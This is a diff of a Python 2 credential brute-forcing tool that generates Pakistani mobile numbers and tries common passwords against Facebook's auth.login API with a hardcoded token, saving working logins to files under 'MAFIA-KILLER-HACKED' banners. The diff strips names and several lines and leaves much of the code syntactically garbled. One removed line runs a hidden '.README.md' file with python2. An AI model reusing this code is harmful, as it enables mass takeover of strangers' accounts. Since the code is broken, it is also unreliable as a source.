@@ -47,14 +47,14 @@ def t():
     time.sleep(1)
 def cb():
     os.system('clear')
-##### Dev : Arbab Ali Memon#####
+
 ##### LOGO #####
 logo='''
 \x1b[1;93m--------------------------------------------------------------
-\x1b[1;92m➣  NAME  : FAROOQ ANSARI
-\x1b[1;91m➣  TEAM NAME : MAFIA-KILLER-TEAM
-\x1b[1;93m➣  WHATSAPP NO     : +92132197796
-\x1b[1;95m➣  WARNING  : DON,T CALL ME ONLY TEXT
+
+
+\x1b[1;93m➣  WHATSAPP
+\x1b[1;95m➣  Y TEXT
 \x1b[1;96m➣  FUNE CODE : AGEA ME JAWAN HO KAR
 \x1b[1;97m➣  NOTE     : USE FAST 4G SIM NET.
 \x1b[1;94m➣  DISCLAMIAR :AWAY FROM ILLIGAL WAY.
@@ -76,9 +76,9 @@ def menu():
 	print "\033[1;92m[2]  TELINOR"
 	print "\033[1;92m[3]  WARID"
 	print "\033[1;92m[4]  UFONE"
-	print "\033[1;92m[5]  ZONG"
-	print "\033[1;92m[6]  UPDATE SYSTEM"
-	print "\033[1;92m[0]  EXIT_KALTI MAR"	    
+	
+	
+	    
 	print 50*'-'
 	action()
 	
@@ -97,7 +97,7 @@ def action():
 			c = raw_input(" SELECTED CODE: ")
 			k="+923"
 			idlist = ('.txt')
-			for line in open(idlist,"r").readlines():
+			.readlines():
 				id.append(line.strip())
 		except IOError:
 			print ("[!] File Not Found")
@@ -126,7 +126,7 @@ def action():
 		print "\033[1;94m20, 21, 22, 23,"
 		print "\033[1;95m24, ??, ??, ??,"
 		try:
-			c = raw_input(" SELECTED CODE: ")
+			
 			k="+923"
 			idlist = ('.txt')
 			for line in open(idlist,"r").readlines():
@@ -139,7 +139,7 @@ def action():
 		os.system("clear")
 		print (logo)
 		print "\033[1;91mUFONE CODE HERE"		
-		print "\033[1;94m31, 32, 33, 34,"
+		, 33, 34,"
 		print "\033[1;95m35, 36, 37, ??,"
 		try:
 			c = raw_input(" SELECTED CODE: ")
@@ -225,7 +225,7 @@ def action():
 					cps.close()
 					cpb.append(c+user+pass1)
 				else:	
-					pass2 = '786000'
+					
 					data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
 			                q = json.load(data)
 					if 'access_token' in q:
@@ -242,37 +242,33 @@ def action():
 							cps.close()
 							cpb.append(c+user+pass2)
 						else:	
-							pass3 = '000786'
+							
 							data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
 			                                q = json.load(data)
-							if 'access_token' in q:
-								print '\x1b[1;91mMAFIA-KILLER-HACKED√\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass3
+							if 'access_' in q:
+								1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass3
 								okb = open('save/successfull.txt', 'a')
 								okb.write(k+c+user+'|'+pass3+'\n')
 								okb.close()
 								oks.append(c+user+pass3)
 							else:	
 								if 'www.facebook.com' in q['error_msg']:
-									print '\x1b[1;92mAFTER(3DAYS)🗝\x1b[1;95m-\x1b[1;93m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass3
+									[1;93m✙\x1b[1;95m-' + pass3
 									cps = open('save/checkpoint.txt', 'a')
 									cps.write(k+c+user+'|'+pass3+'\n')
-									cps.close()
+									
 									cpb.append(c+user+pass3)
 								
 							
-		except:
-			pass
 		
 	p = ThreadPool(30)
 	p.map(main, id)
 	print 50*'-'
 	print '[✓] Process Has Been Completed ....'
-	print '[✓] Total OK/CP : '+str(len(oks))+'/'+str(len(cpb))
+	
 	print('[✓] CP File Has Been Saved : save/checkpoint.txt')
-	raw_input('\n[Press Enter To Go Back]')
-	os.system('python2 .README.md')
+	
 		
-if __name__ == '__main__':
-	menu()
+
 
 
